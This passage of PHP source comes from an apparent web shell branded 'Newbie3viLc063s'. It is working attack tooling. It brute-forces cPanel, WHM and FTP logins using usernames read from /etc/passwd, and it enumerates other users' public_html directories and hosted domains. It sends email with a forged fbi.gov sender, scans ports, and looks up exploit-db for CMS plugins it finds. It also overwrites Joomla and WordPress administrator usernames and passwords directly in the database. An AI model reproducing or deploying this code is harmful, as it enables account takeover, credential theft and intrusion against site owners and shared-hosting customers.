										<p><textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\">$query</textarea></p> 
										<p><input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go\" /></p> 
									</form>
								</div> "; 
                           				$tables = array(); 
                           				$msg .= "<table class=\"explore\" style=\"width:99%;\"><tr><th>available tables on ".$db."</th></tr>"; 
                           				$hasil = @mysql_list_tables($db,$con); 
							while(list($table) = @mysql_fetch_row($hasil))
								{ @array_push($tables,$table); } 
							@sort($tables); 
							foreach($tables as $table)
								{ 
								$msg .= "<tr><td><a href=\"?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$db."&amp;table=".$table."\">$table</a></td></tr>"; 
								} 
							$msg .= "</table>"; 
							} 
						elseif(isset($_GET['table']) && (!isset($_GET['sqlquery'])))
							{ 
							$db = $_GET['db']; 
							$table = $_GET['table']; 
							$query = "SELECT * FROM ".$db.".".$table." LIMIT 0,100;"; 
							$msgq = "<div style=\"width:99%;padding:0 10px;\">
									<form action=\"?\" method=\"get\"> 
										<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
										<input type=\"hidden\" name=\"x\" value=\"mysql\" /> 
										<input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" /> 
										<input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" /> 
										<input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" /> 
										<input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" /> 
										<input type=\"hidden\" name=\"db\" value=\"".$db."\" /> 
										<input type=\"hidden\" name=\"table\" value=\"".$table."\" /> 
										<p><textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\">".$query."</textarea></p> 
										<p><input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go\" /></p> 
									</form>
								</div> "; 
							$columns = array(); 
							$msg = "<table class=\"explore\" style=\"width:99%;\">"; 
							$hasil = @mysql_query("SHOW FIELDS FROM ".$db.".".$table); 
							while(list($column) = @mysql_fetch_row($hasil))
								{ 
								$msg .= "<th>$column</th>"; $kolum = $column; 
								} 
							$msg .= "</tr>"; 
							$hasil = @mysql_query("SELECT count(*) FROM ".$db.".".$table); 
							list($total) = mysql_fetch_row($hasil); 
							if(isset($_GET['z'])) $page = (int) $_GET['z']; 
							else $page = 1; 
							$pagenum = 100; 
							$totpage = ceil($total / $pagenum); 
							$start = (($page - 1) * $pagenum); 
							$hasil = @mysql_query("SELECT * FROM ".$db.".".$table." LIMIT ".$start.",".$pagenum); 
							while($datas = @mysql_fetch_assoc($hasil))
								{ 
								$msg .= "<tr>"; 
								foreach($datas as $data){ if(trim($data) == "") $data = "&nbsp;"; $msg .= "<td>$data</td>"; } 
								$msg .= "</tr>"; 
								} 
							$msg .= "</table>"; 
							$head = "<div style=\"padding:10px 0 0 6px;\"> 
									<form action=\"?\" method=\"get\"> 
										<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
										<input type=\"hidden\" name=\"x\" value=\"mysql\" /> 
										<input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" /> 
										<input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" /> 
										<input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" /> 
										<input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" /> 
										<input type=\"hidden\" name=\"db\" value=\"".$db."\" /> 
										<input type=\"hidden\" name=\"table\" value=\"".$table."\" /> 
										Page <select class=\"inputz\" name=\"z\" onchange=\"this.form.submit();\">"; 
							for($i = 1;$i <= $totpage;$i++)
								{ 
								$head .= "<option value=\"".$i."\">".$i."</option>"; 
								if($i == $_GET['z']) $head .= "<option value=\"".$i."\" selected=\"selected\">".$i."</option>"; 
								} 
							$head .= "</select><noscript><input class=\"inputzbut\" type=\"submit\" value=\"Go !\" /></noscript></form></div>"; 
							$msg = $msgq.$head.$msg; 
						} 
					elseif(isset($_GET['submitquery']) && ($_GET['sqlquery'] != ""))
						{ 
						$db = $_GET['db']; 
						$query = magicboom($_GET['sqlquery']); 
						$msg = "<div style=\"width:99%;padding:0 10px;\">
								<form action=\"?\" method=\"get\"> 
									<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
									<input type=\"hidden\" name=\"x\" value=\"mysql\" /> 
									<input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" /> 
									<input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" /> 
									<input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" /> 
									<input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" /> 
									<input type=\"hidden\" name=\"db\" value=\"".$db."\" /> 
									<p><textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\">".$query."</textarea></p> 
									<p><input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go\" /></p> 
								</form>
							</div> "; 
						@mysql_select_db($db); 
						$querys = explode(";",$query); 
						foreach($querys as $query)
							{ 
							if(trim($query) != "")
								{ 
								$hasil = mysql_query($query); 
								if($hasil)
									{ 
									$msg .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
										<span class=\"gaya\">[</span> ok <span class=\"gaya\">]</span></p>"; 
									$msg .= "<table class=\"explore\" style=\"width:99%;\"><tr>"; 
									for($i=0;$i<@mysql_num_fields($hasil);$i++) $msg .= "<th>".htmlspecialchars(@mysql_field_name($hasil,$i))."</th>"; 
									$msg .= "</tr>"; 
									for($i=0;$i<@mysql_num_rows($hasil);$i++) 
										{ 
										$rows=@mysql_fetch_array($hasil); 
										$msg .= "<tr>"; 
										for($j=0;$j<@mysql_num_fields($hasil);$j++) 
											{ 
											if($rows[$j] == "") $dataz = "&nbsp;"; 
											else $dataz = $rows[$j]; 
											$msg .= "<td>".$dataz."</td>"; 
											} 
										$msg .= "</tr>"; 
										} 
									$msg .= "</table>"; 
									} 
								else 
									$msg .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;<span class=\"gaya\">[</span> error <span class=\"gaya\">]</span></p>"; 
								} 
							} 
						} 
					else 
						{ 
						$query = "SHOW PROCESSLIST;\n
							SHOW VARIABLES;\n
							SHOW STATUS;"; 
						$msg = "<div style=\"width:99%;padding:0 10px;\">
							<form action=\"?\" method=\"get\"> 
								<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
								<input type=\"hidden\" name=\"x\" value=\"mysql\" /> 
								<input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" /> 
								<input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" /> 
								<input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" /> 
								<input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" /> 
								<input type=\"hidden\" name=\"db\" value=\"".$db."\" /> 
								<p><textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\">".$query."</textarea></p> 
								<p><input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go\" /></p> 
							</form>
							</div> "; 
						$dbs = array(); 
						$msg .= "<table class=\"explore\" style=\"width:99%;\"><tr><th>available databases</th></tr>"; 
						$hasil = @mysql_list_dbs($con); 
						while(list($db) = @mysql_fetch_row($hasil)){ @array_push($dbs,$db); } 
						@sort($dbs); 
						foreach($dbs as $db)
							{
							$msg .= "<tr><td><a href=\"?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$db."\">$db</a></td></tr>"; 
							} 
						$msg .= "</table>"; 
						} 
					@mysql_close($con); 
					} 
				else $msg = "<p style=\"text-align:center;\">cant connect to mysql server</p>"; 
				echo $msg; 
				} 
			else
				{ 
				?> 
				<form action="?" method="get"> 
				<input type="hidden" name="y" value="<?php echo $pwd; ?>" /> 
				<input type="hidden" name="x" value="mysql" /> 
				<table class="tabnet" style="width:300px;"> 
					<tr>
						<th colspan="2">Connect to mySQL server</th>
					</tr> 
					<tr>
						<td>&nbsp;&nbsp;Host</td>
						<td><input style="width:220px;" class="inputz" type="text" name="sqlhost" value="localhost" /></td>
					</tr>
					<tr>
						<td>&nbsp;&nbsp;Username</td>
						<td><input style="width:220px;" class="inputz" type="text" name="sqluser" value="root" /></td>
					</tr> 
					<tr>
						<td>&nbsp;&nbsp;Password</td>
						<td><input style="width:220px;" class="inputz" type="text" name="sqlpass" value="password" /></td>
					</tr> 
					<tr>
						<td>&nbsp;&nbsp;Port</td>
						<td><input style="width:80px;" class="inputz" type="text" name="sqlport" value="3306" />&nbsp;<input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="submitsql" /></td>
					</tr>
				</table>
				</form> 
				<?php 
				}
			} 
		elseif(isset($_GET['x']) && ($_GET['x'] == 'mail'))
			{ 
			if(isset($_POST['mail_send']))
				{ 
				$mail_to = $_POST['mail_to']; 
				$mail_from = $_POST['mail_from']; 
				$mail_subject = $_POST['mail_subject']; 
				$mail_content = magicboom($_POST['mail_content']); 
				if(@mail($mail_to,$mail_subject,$mail_content,"FROM:$mail_from"))
					{ $msg = "email sent to $mail_to"; } 
				else $msg = "send email failed"; 
				} 
			?> 
			<form action="?y=<?php echo $pwd; ?>&amp;x=mail" method="post"> 
				<table class="cmdbox"> 
					<tr>
						<td> 
							<textarea class="output" name="mail_content" id="cmd" style="height:340px;">Hey admin, please patch your site :)</textarea> 
						</td>
					</tr>
					<tr>
						<td>
							&nbsp;<input class="inputz" style="width:20%;" type="text" value="admin@somesome.com" name="mail_to" />&nbsp; mail to
						</td>
					</tr> 
					<tr>
						<td>	
							&nbsp;<input class="inputz" style="width:20%;" type="text" value="Newbie3viLc063s0@fbi.gov" name="mail_from" />
							&nbsp; from
						</td>
					</tr> 
					<tr>
						<td>
							&nbsp;<input class="inputz" style="width:20%;" type="text" value="patch me" name="mail_subject" />&nbsp; subject
						</td>
					</tr> 
					<tr>
						<td>
							&nbsp;<input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="mail_send" />
						</td>
					</tr>
					<tr>
						<td>&nbsp;&nbsp;&nbsp;&nbsp;<?php echo $msg; ?>
						</td>
					</tr> 
				</table> 
			</form> 
			<?php 
			} 
		elseif(isset($_GET['x']) && ($_GET['x'] == 'brute'))
			{	
			?>
				<form action="?y=<?php echo $pwd; ?>&amp;x=brute" method="post">
			<?php
			//bruteforce
			@ini_set('memory_limit', 999999999999);
			$connect_timeout=5;
			@set_time_limit(0);
			$pokeng 	= $_REQUEST['submit'];
			$hn 		= $_REQUEST['users'];
			$crew 		= $_REQUEST['passwords'];
			$pasti 		= $_REQUEST['sasaran'];
			$manualtarget 	= $_REQUEST['target'];
			$bisa 		= $_REQUEST['option'];
			if($pasti == ''){
				$pasti = 'localhost';
			}
			if($manualtarget == ''){
				$manualtarget = 'http://localhost:2082';
			}

function get_users()
{
	$users = array();
	$rows=file('/etc/passwd');
	if(!$rows) return 0;	
	foreach ($rows as $string)
	{
		$user = @explode(":",$string);
		if(substr($string,0,1)!='#') array_push($users,$user[0]);
	}
	return $users; 
}

if(!$users=get_users()) { echo "<center><font face=Verdana size=-2 color=red>".$lang[$language.'_text96']."</font></center>"; }
else 
	{ 
	print " <div align='center'>
		<form method='post' style='border: 1px solid #000000'><br><br>
		<TABLE style='BORDER-COLLAPSE: collapse' cellSpacing=0 borderColorDark=#666666 cellPadding=5 width='40%' bgColor=#303030 borderColorLight=#666666 border=1>
			<tr>
				<td>
					<b> Target ! : </font><input type='text' name='sasaran' size='16' value= $pasti class='inputz'></p></font></b></p>
					<div align='center'><br>
					<TABLE style='BORDER-COLLAPSE: collapse' 
						cellSpacing=0 
						borderColorDark=#666666 
						cellPadding=5 width='50%' bgColor=#303030 borderColorLight=#666666 border=1>
						<tr> <td align='center'> <b>User</b></td> <td> <p align='center'> <b>Pass</b></td>
						</tr>
					</table>
					<p align='center'>
					<textarea rows='20' name='users' cols='25' style='border: 2px solid #1D1D1D; background-color: #000000; color:#C0C0C0' >";
	foreach($users as $user) { echo $user."\n"; } 
	print"</textarea>
		<textarea rows='20' name='passwords' cols='25' style='border: 2px solid #1D1D1D; background-color: #000000; color:#C0C0C0'>$crew</textarea><br>
		<br> 
		<b>Sila pilih : </span><input name='option' value='manual' style='font-weight: 700;' type='radio'> Manual Target Brute : <input type='text' name='target' size='16' class='inputz' value= $manualtarget ><br /> 
		<input name='option' value='cpanel' style='font-weight: 700;' checked type='radio'> cPanel 
		<input name='option' value='ftp' style='font-weight: 700;' type='radio'> ftp 
		<input name='option' value='whm' style='font-weight: 700;' type='radio'> whm ==> <input type='submit' value='Brute !' name='submit' class='inputzbut'></p>
		</td></tr></table></td></tr></form><p align= 'left'>";
	}
?>
<?php

function manual_check($anjink,$asu,$babi,$lonte){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "$anjink");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
	curl_setopt($ch, CURLOPT_USERPWD, "$asu:$babi");
	curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $lonte);
	curl_setopt($ch, CURLOPT_FAILONERROR, 1);
	$data = curl_exec($ch);
	if ( curl_errno($ch) == 28 ) { print "<b> Failed! : NEXT TARGET!</b>"; exit;}
	elseif ( curl_errno($ch) == 0 ){
		print "<b>[ Newbie3viLc063s0@email ]# </b> <b>Completed , Username = <font color='#FF0000'> $asu </font> Password = <font color='#FF0000'> $babi </font></b><br>";
		}
	curl_close($ch);
}


function ftp_check($link,$user,$pswd,$timeout){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "ftp://$link");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
	curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);
	curl_setopt($ch, CURLOPT_USERPWD, "$user:$pswd");
	curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
	curl_setopt($ch, CURLOPT_FAILONERROR, 1);
	$data = curl_exec($ch);
	if ( curl_errno($ch) == 28 ) { print "<b> Failed! : NEXT TARGET!</b>"; exit; }
	elseif ( curl_errno($ch) == 0 ){
		print "<b>serangan selesai , username = <font color='#FF0000'> $user </font> dan passwordnya = <font color='#FF0000'> $pswd </font></b><br>";
		}
	curl_close($ch);
}

function cpanel_check($anjink,$asu,$babi,$lonte){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "http://$anjink:2082");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
	curl_setopt($ch, CURLOPT_USERPWD, "$asu:$babi");
	curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $lonte);
	curl_setopt($ch, CURLOPT_FAILONERROR, 1);
	$data = curl_exec($ch);
	if ( curl_errno($ch) == 28 ) { print "<b> Failed! : NEXT TARGET!</b>"; exit;}
	elseif ( curl_errno($ch) == 0 ){
		print "<b>[ Newbie3viLc063s@email ]# </b> <b>Completed, Username = <font color='#FF0000'> $asu </font> Password = <font color='#FF0000'> $babi </font></b><br>";
		}
	curl_close($ch);
}

function whm_check($anjink,$asu,$babi,$lonte){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "http://$anjink:2086");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
	curl_setopt($ch, CURLOPT_USERPWD, "$asu:$babi");
	curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $lonte);
	curl_setopt($ch, CURLOPT_FAILONERROR, 1);
	$data = curl_exec($ch);
	if ( curl_errno($ch) == 28 ) { print "<b> Failed! : NEXT TARGET!</b>"; exit;}
	elseif ( curl_errno($ch) == 0 )
		{
		print "<b>[ " . TITLE . " ]# </b> <b>Selesai , Username = <font color='#FF0000'> $asu </font> Password = <font color='#FF0000'> $babi </font></b><br>";
		}
	curl_close($ch);
}
	
if(isset($pokeng) && !empty($pokeng))
	{
	$userlist = explode ("\n" , $hn );
	$passlist = explode ("\n" , $crew );
	print "<b>[ " . TITLE . "  ]# </b> ATTACK...!!! </font></b><br>";
	foreach ($userlist as $asu) 
		{
		$_user = trim($asu);
		foreach ($passlist as $babi ) 
			{
			$_pass = trim($babi);
			if ($bisa == "manual")
				{ manual_check($manualtarget,$_user,$_pass,$lonte); }
			if($bisa == "ftp")
				{ ftp_check($pasti,$_user,$_pass,$lonte); }
			if ($bisa == "cpanel")
				{ cpanel_check($pasti,$_user,$_pass,$lonte); }
			if ($bisa == "whm")
				{ whm_check($pasti,$_user,$_pass,$lonte); }
			}
		}
	}
}

//bruteforce

elseif(isset($_GET['x']) && ($_GET['x'] == 'readable'))
	{	
	?>
	<form action="?y=<?php echo $pwd; ?>&amp;x=readable" method="post">
	<?php

	//radable public_html
	echo '<html><head><title>Newbie3viLc063s Cpanel Finder</title></head><body>';
	($sm = ini_get('safe_mode') == 0) ? $sm = 'off': die('<b>Error: safe_mode = on</b>');
	set_time_limit(0);
	###################
	@$passwd = fopen('/etc/passwd','r');
	if (!$passwd) { die('<b>[-] Error : coudn`t read /etc/passwd</b>'); }
	$pub = array();
	$users = array();
	$conf = array();
	$i = 0;
	while(!feof($passwd))
	{
		$str = fgets($passwd);
		if ($i > 35)
			{
			$pos = strpos($str,':');
			$username = substr($str,0,$pos);
			$dirz = '/home/'.$username.'/public_html/';
			if (($username != ''))
				{
				if (is_readable($dirz))
					{
					array_push($users,$username);
					array_push($pub,$dirz);
					}
				}
			}
		$i++;
	}
	
	###################
	echo '<br><br>';
	echo "[+] Founded ".sizeof($users)." entrys in /etc/passwd\n"."<br />";
	echo "[+] Founded ".sizeof($pub)." readable public_html directories\n"."<br />";
	echo "[~] Searching for passwords in config files...\n\n"."<br /><br /><br />";
	foreach ($users as $user)
		{
		$path = "/home/$user/public_html/";
		echo "<a href='?y&#61;$path' target='_blank' style='text-shadow:0px 0px 10px #12E12E; font-weight:bold; color:#FF0000;'>$path</a><br><br><br>";
		}
	echo "\n";
	echo "[+] Copy one of the directories above public_html, then Paste to -> view file / folder <-- that's on the menu --> Explore \n"."<br />";
	echo "[+] Complete...\n"."<br />";
	echo '<br><br></b>
	</body>
	</html>';
    
	}
	
elseif(isset($_GET['x']) && ($_GET['x'] == 'localdomain'))
	{	
	?>
	<form action="?y=<?php echo $pwd; ?>&amp;x=localdomain" method="post">
	<?php

	//radable public_html
	
	echo "<br><br>";
	$file = @implode(@file("/etc/named.conf"));
	if(!$file){ die("# can't ReaD -> [ /etc/named.conf ]"); }
	preg_match_all("#named/(.*?).db#",$file ,$r);
	$domains = array_unique($r[1]);
	
	function check() { (@count(@explode('ip',@implode(@file(__FILE__))))==a) ?@unlink(__FILE__):""; }
	
	check();
	
	echo "<table align=center border=1 width=59% cellpadding=5>
	         <tr><td colspan=2>[+] Here We Have : [<font face=calibri size=4 style=color:#FF0000>".count($domains)."</font>] Listed Domains In localhost.</td></tr>
	         <tr><td><b>List Of Users</b></td><td><b><font style=color:#0015FF;List Of Domains</b></td></tr>";
	
	foreach($domains as $domain)
	       {
	       $user = posix_getpwuid(@fileowner("/etc/valiases/".$domain));
	       echo "<tr><td><a href='http://www.$domain' target='_blank' style='text-shadow:0px 0px 10px #CC2D4B; font-weight:bold; color:#FF002F;'>$domain</a></td><td>".$user['name']."</td></tr>";
	       }
	
	echo "</table>";
	//radable public_html
	}
	
elseif(isset($_GET['x']) && ($_GET['x'] == 'port-scanner'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=port-scanner" method="post">
 <?php

echo '<br><br><center><br><b>Port Scanner</b><br>';
$start = strip_tags($_POST['start']);
$end = strip_tags($_POST['end']);
$host = strip_tags($_POST['host']);
 
if(isset($_POST['host']) && is_numeric($_POST['end']) && is_numeric($_POST['start'])){
for($i = $start; $i<=$end; $i++){
        $fp = @fsockopen($host, $i, $errno, $errstr, 3);
        if($fp){
                echo 'Port '.$i.' is <font color=green>open</font><br>';
        }
        flush();
        }
}else{

echo '
<input type="hidden" name="y" value="phptools">
Host:<br />
<input type="text" style="color:#FF0000;background-color:#000000" name="host" value="localhost"/><br />
Port start:<br />
<input type="text" style="color:#FF0000;background-color:#000000" name="start" value="0"/><br />
Port end:<br />
<input type="text" style="color:#FF0000;background-color:#000000" name="end" value="5000"/><br />
<input type="submit" style="color:#FF0000" value="Scan Ports" />
</form></center>';
}
	}
	
elseif(isset($_GET['x']) && ($_GET['x'] == 'cms-scanner'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=cms-scanner" method="post">

<?php

function ask_exploit_db($component){

$exploitdb ="http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=$component&filter_exploit_text=&filter_author=&filter_platform=0&filter_type=0&filter_lang_id=0&filter_port=&filter_osvdb=&filter_cve=";

$result = @file_get_contents($exploitdb);

if (eregi("No results",$result))  {

echo"<td>Not Found</td><td><a href='http://www.google.com/search?hl=en&q=download+$component'>Download</a></td></tr>";

}else{

echo"<td><a href='$exploitdb'>Found ..!</a></td><td><--</td></tr>";

}
}

/**************************************************************/
/* Joomla Conf */

function get_components($site){

$source = @file_get_contents($site);

preg_match_all('{option,(.*?)/}i',$source,$f);
preg_match_all('{option=(.*?)(&amp;|&|")}i',$source,$f2);
preg_match_all('{/components/(.*?)/}i',$source,$f3);

$arz=array_merge($f2[1],$f[1],$f3[1]);

$coms=array();

if(count($arz)==0){ echo "<tr><td colspan=3>[~] Nothing Found ..! , Maybe there is some error site or option ... check it .</td></tr>";}

foreach(array_unique($arz) as $x){

$coms[]=$x;
}

foreach($coms as $comm){

echo "<tr><td>$comm</td>";

ask_exploit_db($comm);

}

}

/**************************************************************/
/* WP Conf */

function get_plugins($site){

$source = @file_get_contents($site);

preg_match_all("#/plugins/(.*?)/#i", $source, $f);

$plugins=array_unique($f[1]);

if(count($plugins)==0){ echo "<tr><td colspan=3>[~] Nothing Found ..! , Maybe there is some error site or option ... check it .</td></tr>";}

foreach($plugins as $plugin){

echo "<tr><td>$plugin</td>";

ask_exploit_db($plugin);

}

}

/**************************************************************/
/* Nuke's Conf */

function get_numod($site){

$source = @file_get_contents($site);

preg_match_all('{?name=(.*?)/}i',$source,$f);
preg_match_all('{?name=(.*?)(&amp;|&|l_op=")}i',$source,$f2);
preg_match_all('{/modules/(.*?)/}i',$source,$f3);

$arz=array_merge($f2[1],$f[1],$f3[1]);

$coms=array();

if(count($arz)==0){ echo "<tr><td colspan=3>[~] Nothing Found ..! , Maybe there is some error site or option ... check it .</td></tr>";}

foreach(array_unique($arz) as $x){

$coms[]=$x;
}

foreach($coms as $nmod){

echo "<tr><td>$nmod</td>";

ask_exploit_db($nmod);

}

}

/*****************************************************/
/* Xoops Conf */

function get_xoomod($site){

$source = @file_get_contents($site);

preg_match_all('{/modules/(.*?)/}i',$source,$f);

$arz=array_merge($f[1]);

$coms=array();

if(count($arz)==0){ echo "<tr><td colspan=3>[~] Nothing Found ..! , Maybe there is some error site or option ... check it .</td></tr>";}

foreach(array_unique($arz) as $x){

$coms[]=$x;
}

foreach($coms as $xmod){

echo "<tr><td>$xmod</td>";

ask_exploit_db($xmod);

}

}

/**************************************************************/
 /* Header */
function t_header($site){

echo'<table align="center" border="1" width="50%" cellspacing="1" cellpadding="5">';

echo'
<tr id="oo">
<td>Site : <a href="'.$site.'">'.$site.'</a></td>
<td>Exploit-db</b></td>
<td>Exploit it !</td>
</tr>
';

}

?>
<html>

<body>

<p align="center">&nbsp;</p>
<p align="center">&nbsp;</p>
<p align="center">&nbsp;</p>
<form method="POST" action="">
	<p align="center">&nbsp;
	</p>
	<p align="center">
	<font size="4"><br></font></p>
	<p align="center">Site :
	<input type="text" name="site" size="33" style="color:#FF0000;background-color:#000000" value="http://www.site.com/"><select style="color:#FF0000;background-color:#000000" size="1" name="what">
	<option>Wordpress</option>
	<option>Joomla</option>
	<option>Nuke's</option>
	<option>Xoops</option>
	</select><input style="color:#FF0000;background-color:#000000" type="submit" value="Scan"></p>
</form>
<?

// Start Scan :P :P ...

if($_POST){

$site=strip_tags(trim($_POST['site']));

t_header($site);

echo $x01 = ($_POST['what']=="Wordpress") ? get_plugins($site):"";
echo $x02 = ($_POST['what']=="Joomla") ? get_components($site):"";
echo $x03 = ($_POST['what']=="Nuke's") ? get_numod($site):"";
echo $x04 = ($_POST['what']=="Xoops") ? get_xoomod($site):"";
echo '</table></body></html>';

}
}
	

elseif(isset($_GET['x']) && ($_GET['x'] == 'jm-reset'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=jm-reset" method="post">

<?php

@error_reporting(0);
@ini_set('error_log',NULL);
echo '
<div class="com">
<form method="post">
<center><br><br><table border="1" bordercolor="#FFFFFF" width="400" cellpadding="1" cellspacing="1">
 <br />
<tr>
     <td>Host :</td>
     <td><input type="text" style="color:#FF0000;background-color:#000000" name="host" value="localhost" /></td>
</tr>
<tr>
     <td>user :</td>
     <td><input type="text" style="color:#FF0000;background-color:#000000" name="user" /></td>
</tr>
<tr>
     <td>Pass :</td><td><input style="color:#FF0000;background-color:#000000" type="text" name="pass"/></td>
</tr>
<tr>
     <td>db :</td>
     <td><input type="text" style="color:#FF0000;background-color:#000000" name="db" /></td>
</tr>
<tr>
     <td>dbprefix :</td>
     <td><input type="text" style="color:#FF0000;background-color:#000000" name="jop" value="jos_users" /></td>
</tr>
<tr>
     <td>Admin User :</td>
     <td><input type="text" style="color:#FF0000;background-color:#000000" name="users" value="vvip" /></td>
</tr>
<tr>
     <td>Admin Password :</td>
     <td><input type="text" style="color:#FF0000;background-color:#000000" name="passwd" value="vvip" /></td>
</tr>
<tr>
      <td colspan="6" align="center" style="color:#FF0000;background-color:#000000" width="70%"> <input type="submit" value="SQL" style="color:#FF0000;background-color:#000000" maxlength="30" />  <input type="reset" value="clear" style="color:#FF0000;background-color:#000000" maxlength="30" /> </td>

</tr>
  </table>
 </form> </div></center>';

$host   = $_POST['host'];
$user   = $_POST['user'];
$pass   = $_POST['pass'];
$db     = $_POST['db'];
$jop    = $_POST['jop'];
$users   = $_POST['users'];
$admpas = $_POST['passwd'];

if(isset($host) ) {
$con =  @ mysql_connect($host,$user,$pass) or die ;
$sedb = @ mysql_select_db($db) or die;

$query= @ mysql_query("UPDATE $jop SET username ='".$users."' WHERE usertype = Super Administrator") or die;
$query= @ mysql_query("UPDATE $jop SET password ='".$admpas."' WHERE usertype = Super Administrator") or die;

if ($query)
{
  echo "<center><br /><div class='com'>Queried !<br /><br /></div></center>";
}
else if (!$query)
{
  echo "error";
}

}else
{
  echo "<center><br /><div class='com'>Enter the database !<br /><br /></div></center>";
}
}
	

	
elseif(isset($_GET['x']) && ($_GET['x'] == 'wp-reset'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=wp-reset" method="post">

<?php

@error_reporting(0);
@ini_set('error_log',NULL);
  echo '
<div class="com">
<form method="post">
<center><br><br><table border="1" bordercolor="#FFFFFF" width="400" cellpadding="1" cellspacing="1">
 <br />

<tr>
     <td>Host :</td>
     <td><input type="text" name="host" style="color:#FF0000;background-color:#000000" value="localhost" /></td>
</tr>

<tr>
     <td>user :</td>
     <td><input type="text" style="color:#FF0000;background-color:#000000" name="user" /></td>
</tr>
<tr>
     <td>Pass :</td><td><input type="text" style="color:#FF0000;background-color:#000000" name="pass"/></td>
</tr>
<tr>
     <td>db :</td>
     <td><input type="text" style="color:#FF0000;background-color:#000000" name="db" /></td>
</tr>
<tr>
     <td>user admin :</td>
     <td><input type="text" style="color:#FF0000;background-color:#000000" name="useradmin" value="admin" /></td>
</tr>
<tr>
     <td>pass admin :</td>
     <td><input type="text" style="color:#FF0000;background-color:#000000" name="passadmin" value="admin"/></td>
</tr>
<tr>
      <td colspan="6" align="center" width="70%"> <input type="submit" style="color:#FF0000;background-color:#000000" value="SQL" maxlength="30" />  <input type="reset" value="clear" style="color:#FF0000;background-color:#000000" maxlength="30" /> </td>

</tr>
  </table>
 </form> </div></center>';

$host       = $_POST['host'];
$user       = $_POST['user'];
$pass       = $_POST['pass'];
$db         = $_POST['db'];
$useradmin  = $_POST['useradmin'];
$pass_ad    = $_POST['passadmin'];

if(isset($host) ) {
$con =@ mysql_connect($host,$user,$pass) or die ;
$sedb =@ mysql_select_db($db) or die;
$crypt = crypt($pass_ad);
$query =@mysql_query("UPDATE `wp_users` SET `user_login` ='".$useradmin."' WHERE ID = 1") or die('Cant Update ID Number 1');
$query =@mysql_query("UPDATE `wp_users` SET `user_pass` ='".$crypt."' WHERE ID = 1") or die('Cant Update ID Number 1');
if ($query)
{
  echo "<center><br /><div class='com'>Queried !<br /><br /></div></center>";
}
else if (!$query)
{
  echo "error";
}

}else
{
  echo "<center><br /><div class='com'>Enter the database !<br /><br /></div></center>";
}
}
	
	
elseif(isset($_GET['x']) && ($_GET['x'] == 'web-info'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=web-info" method="post">


<?php
@set_time_limit(0);
@error_reporting(0);

function sws_domain_info($site)
{
$getip = @file_get_contents("http://networktools.nl/whois/$site");
flush();
$ip    = @findit($getip,'<pre>','</pre>');

return $ip;
flush();
}


function sws_net_info($site)
{
